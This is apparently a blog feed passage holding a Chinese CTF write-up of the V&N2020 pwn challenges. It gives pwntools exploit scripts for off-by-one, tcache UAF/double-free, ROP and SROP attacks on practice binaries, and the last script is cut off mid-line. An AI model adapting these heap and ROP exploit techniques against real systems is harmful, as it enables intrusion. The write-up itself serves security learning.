    <summary type="html">&lt;p&gt;前段时间因为身体原因摆烂了一周多了，今天又才重新开始做题，报了几场比赛都没能打成就很烦。&lt;/p&gt;
&lt;h2 id=&quot;ret2dl-runtime-resolve&quot;&gt;&lt;a href=&quot;#ret2dl-runtime-resolve&quot; class=&quot;headerlink&quot; tit</summary>
      
    
    
    
    <category term="pwn" scheme="https://cv196082.gitee.io/categories/pwn/"/>
    
    
    <category term="ret2dl-runtime-resolve" scheme="https://cv196082.gitee.io/tags/ret2dl-runtime-resolve/"/>
    
  </entry>
  
  <entry>
    <title>V&amp;N2020 公开赛复现</title>
    <link href="https://cv196082.gitee.io/2022/01/20/V-N2020-%E5%85%AC%E5%BC%80%E8%B5%9B%E5%A4%8D%E7%8E%B0/"/>
    <id>https://cv196082.gitee.io/2022/01/20/V-N2020-%E5%85%AC%E5%BC%80%E8%B5%9B%E5%A4%8D%E7%8E%B0/</id>
    <published>2022-01-20T10:47:10.000Z</published>
    <updated>2022-01-20T11:10:18.296Z</updated>
    
    <content type="html"><![CDATA[<p>总结一下:经过GFCTF的摧残打算复现一场较为简单的比赛了，虽然较为简单，但是也会有新东西学到哦。</p><h2 id="simpleHeap"><a href="#simpleHeap" class="headerlink" title="simpleHeap"></a>simpleHeap</h2><p>第一题就是我前几天学得off by one漏洞。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_CBB</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;idx?&quot;</span>);</span><br><span class="line">  v1 = sub_9EA();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt; <span class="number">9</span> || !qword_2020A0[v1] )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;content:&quot;</span>);</span><br><span class="line">  sub_C39(qword_2020A0[v1], dword_202060[v1]);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Done!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>漏洞出现在edit函数内，可以多出一个字节。</p><p>题目主要存在的难点应该是让你多试一下realloc地址应该偏移多少</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># r = process(&#x27;./vn_pwn_simpleHeap&#x27;)</span></span><br><span class="line">r = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">26488</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./vn_pwn_simpleHeap&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">size, data</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;choice: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;size?&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(size), encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;content:&#x27;</span>)</span><br><span class="line">    r.send(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params"><span class="built_in">id</span>, data</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;choice: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;idx?&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(<span class="built_in">id</span>), encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;content:&#x27;</span>)</span><br><span class="line">    r.send(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;choice: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;idx?&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(<span class="built_in">id</span>), encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;choice: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;idx?&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(<span class="built_in">id</span>), encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create(<span class="number">0x68</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x68</span>)  <span class="comment"># 0</span></span><br><span class="line">create(<span class="number">0x60</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x60</span>)  <span class="comment"># 1</span></span><br><span class="line">create(<span class="number">0x60</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x60</span>)  <span class="comment"># 2</span></span><br><span class="line">create(<span class="number">0x60</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x60</span>)  <span class="comment"># 3</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x60</span>+p64(<span class="number">0x70</span>)+p8(<span class="number">0xe0</span>+<span class="number">1</span>))</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">create(<span class="number">0x60</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x60</span>)  <span class="comment"># 1</span></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">main_arena_88 = u64(r.recvuntil(<span class="string">b&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">info(<span class="built_in">hex</span>(main_arena_88))</span><br><span class="line">malloc_hook = malloc_hook = (main_arena_88 &amp; <span class="number">0xFFFFFFFFFFFFF000</span>) + \</span><br><span class="line">    (libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>] &amp; <span class="number">0xfff</span>)</span><br><span class="line">info(<span class="built_in">hex</span>(malloc_hook))</span><br><span class="line">libc_base = malloc_hook-libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">realloc = libc_base+libc.symbols[<span class="string">&#x27;realloc&#x27;</span>]</span><br><span class="line"></span><br><span class="line">one_gadget = libc_base+<span class="number">0x4526a</span></span><br><span class="line"></span><br><span class="line">create(<span class="number">0x60</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x60</span>)  <span class="comment"># 4</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">create(<span class="number">0x60</span>, p64(malloc_hook-<span class="number">0x20</span>+<span class="number">5</span>-<span class="number">8</span>))  <span class="comment"># 1</span></span><br><span class="line">create(<span class="number">0x60</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x60</span>)</span><br><span class="line">create(<span class="number">0x60</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x60</span>)</span><br><span class="line">create(<span class="number">0x60</span>, <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x20</span>-<span class="number">5</span>-<span class="number">8</span>-<span class="number">8</span>)+p64(one_gadget)+p64(realloc+<span class="number">0xc</span>))</span><br><span class="line"><span class="comment"># create(1, b&#x27;&#x27;)</span></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;choice: &#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;size?&#x27;</span>)</span><br><span class="line">r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(<span class="number">0x10</span>), encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">info(<span class="built_in">hex</span>(one_gadget))</span><br><span class="line">info(<span class="built_in">hex</span>(realloc))</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(r)</span></span><br><span class="line"><span class="comment"># flag = flag&#123;e919bec8-e5a6-4c1d-a44a-282f08c57c06&#125;</span></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="easyTHeap"><a href="#easyTHeap" class="headerlink" title="easyTHeap"></a>easyTHeap</h2><p>这道题漏洞发生在delete函数内，没有清楚指针造成UAF</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_D2C</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;idx?&quot;</span>);</span><br><span class="line">  v1 = sub_9EA();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt; <span class="number">6</span> || !*(&amp;unk_202080 + v1) )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="built_in">free</span>(*(&amp;unk_202080 + v1));</span><br><span class="line">  dword_202060[v1] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Done!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过UAF得到tcache struct chunk的地址，再利用double free实现控制tcache struct chunk，进行tcache struct attack。这道题和GFCTF那道题很类似，不过这道简单一点，这里就不赘述可以去看复现GFCTF的那一篇 <a href="https://cv196082.gitee.io/2022/01/11/GFCTF/">https://cv196082.gitee.io/2022/01/11/GFCTF/</a> </p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># r = process(&#x27;./vn_pwn_easyTHeap&#x27;)</span></span><br><span class="line">r = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">25768</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./vn_pwn_easyTHeap&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">size</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;choice: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;size?&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(size), encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params"><span class="built_in">id</span>, content</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;choice: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;idx?&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(<span class="built_in">id</span>), encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;content:&#x27;</span>)</span><br><span class="line">    r.send(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;choice: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;idx?&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(<span class="built_in">id</span>), encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;choice: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;idx?&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(<span class="built_in">id</span>), encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create(<span class="number">0x50</span>)  <span class="comment"># 0</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">tcache_struct_addr = u64(r.recvuntil(<span class="string">b&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x250</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(tcache_struct_addr))</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x50</span>)  <span class="comment"># 1</span></span><br><span class="line">edit(<span class="number">1</span>, p64(tcache_struct_addr))</span><br><span class="line"><span class="comment"># delete(2)</span></span><br><span class="line">create(<span class="number">0x50</span>)  <span class="comment"># 2</span></span><br><span class="line">create(<span class="number">0x50</span>)  <span class="comment"># 3  tcache_struct</span></span><br><span class="line">edit(<span class="number">3</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">show(<span class="number">3</span>)</span><br><span class="line">main_arena_96 = u64(r.recvuntil(<span class="string">b&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(main_arena_96))</span><br><span class="line"></span><br><span class="line">malloc_hook = (main_arena_96 &amp; <span class="number">0xFFFFFFFFFFFFF000</span>) + \</span><br><span class="line">    (libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>] &amp; <span class="number">0xfff</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(malloc_hook))</span><br><span class="line">libc_base = malloc_hook-libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">realloc_addr = libc_base+libc.symbols[<span class="string">&#x27;realloc&#x27;</span>]</span><br><span class="line"></span><br><span class="line">one_gadget = libc_base+<span class="number">0x4f322</span></span><br><span class="line"></span><br><span class="line">create(<span class="number">0x60</span>)  <span class="comment"># 4</span></span><br><span class="line">edit(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x40</span>+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(malloc_hook-<span class="number">8</span>))</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x30</span>)  <span class="comment"># 5</span></span><br><span class="line">edit(<span class="number">5</span>, p64(one_gadget)+p64(realloc_addr+<span class="number">8</span>))</span><br><span class="line"><span class="comment"># gdb.attach(r)</span></span><br><span class="line"></span><br><span class="line">create(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag:flag&#123;ce977aa0-80c8-48c6-a1d0-24ec4f55ce17&#125;</span></span><br></pre></td></tr></table></figure><h2 id="warmup"><a href="#warmup" class="headerlink" title="warmup"></a>warmup</h2><p>题目很简单，不过需要gdb调试一下，调试一下会发现，第一个不存在栈溢出的函数和第二个存在栈溢出的函数的两个栈地址是相邻的。</p><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">26531</span>)</span><br><span class="line"><span class="comment">#r = process(&#x27;./vn_pwn_warmup&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./vn_pwn_warmup&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;gift: &#x27;</span>)</span><br><span class="line"></span><br><span class="line">puts_addr = <span class="built_in">int</span>(r.recvline()[:-<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc_base = puts_addr - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = libc_base + <span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;pop rdi\nret&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>)))</span><br><span class="line">pop_rsi_ret = libc_base + <span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;pop rsi\nret&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>)))</span><br><span class="line">pop_rdx_ret = libc_base + <span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;pop rdx\nret&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>)))</span><br><span class="line"></span><br><span class="line">open_addr = libc_base + libc.symbols[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">read_addr = libc_base + libc.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">free_hook = libc_base + libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x70</span> + <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x8</span></span><br><span class="line">payload += p64(pop_rdi_ret)</span><br><span class="line"></span><br><span class="line">payload2 = p64(<span class="number">0</span>) + p64(pop_rsi_ret) + p64(free_hook) + \</span><br><span class="line">    p64(pop_rdx_ret) + p64(<span class="number">4</span>) + p64(read_addr)</span><br><span class="line">payload2 += p64(pop_rdi_ret) + p64(free_hook) + \</span><br><span class="line">    p64(pop_rsi_ret) + p64(<span class="number">0</span>) + p64(open_addr)</span><br><span class="line">payload2 += p64(pop_rdi_ret) + p64(<span class="number">3</span>) + p64(pop_rsi_ret) + \</span><br><span class="line">    p64(free_hook) + p64(pop_rdx_ret) + p64(<span class="number">100</span>) + p64(read_addr)</span><br><span class="line">payload2 += p64(pop_rdi_ret) + p64(free_hook) + p64(puts_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;something: &#x27;</span>)</span><br><span class="line">r.send(payload2)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;name?&#x27;</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line">r.send(<span class="string">&#x27;flag&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag:flag&#123;963b2367-7364-44bf-8352-2c5552e4219e&#125;</span></span><br></pre></td></tr></table></figure><h2 id="babybabypwn"><a href="#babybabypwn" class="headerlink" title="babybabypwn"></a>babybabypwn</h2><p>这一个是最头疼的，不过我写的exp后面改得和其他wp一样也是打不通就很烦。</p><p>这道题使用的是SROP攻击，原理我还没怎么看懂，不过做题我应该能做出来，所以我就放个exp，后面会把SROP的原理和相关例题在做一篇博客。</p><h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;Linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment"># r = process(&#x27;./vn_pwn_babybabypwn_1&#x27;)</span></span><br><span class="line">r = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">29297</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./vn_pwn_babybabypwn_1&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;Here is my gift: 0x&#x27;</span>)</span><br><span class="line">puts_addr = <span class="built_in">int</span>(r.recvuntil(<span class="string">b&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>), <span class="number">16</span>)</span><br><span class="line">libc_base = puts_addr-libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">info(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">libc_bss = libc.bss()+libc_base+<span class="number">0x100</span></span><br><span class="line">pop_rdi = libc_base + <span class="number">0x21102</span></span><br><span class="line">pop_rsi = libc_base + <span class="number">0x202e8</span></span><br><span class="line">pop_rdx = libc_base + <span class="number">0x1b92</span></span><br><span class="line">read_addr = libc.symbols[<span class="string">&#x27;read&#x27;</span>]+libc_base</span><br><span class="line">open_addr = libc.symbols[<span class="string">&#x27;open&#x27;</span>]+libc_base</span><br><span class="line">write_addr = libc.symbols[<span class="string">&#x27;write&#x27;</span>]+libc_base</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;Please input magic message: &#x27;</span>)</span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rdi = <span class="number">0</span></span><br><span class="line">frame.rsi = libc_bss</span><br><span class="line">frame.rdx = <span class="number">0x100</span></span><br><span class="line">frame.rip = read_addr</span><br><span class="line">frame.rsp = libc_bss</span><br><span class="line">r.send(<span class="built_in">bytes</span>(<span class="built_in">str</span>(frame), encoding=<span class="string">&#x27;utf8&#x27;</span>)[<span class="number">8</span>:])</span><br><span class="line"></span><br><span class="line">flag_addr = libc_bss+<span class="number">0x98</span></span><br><span class="line"></span><br><span class="line">payload = 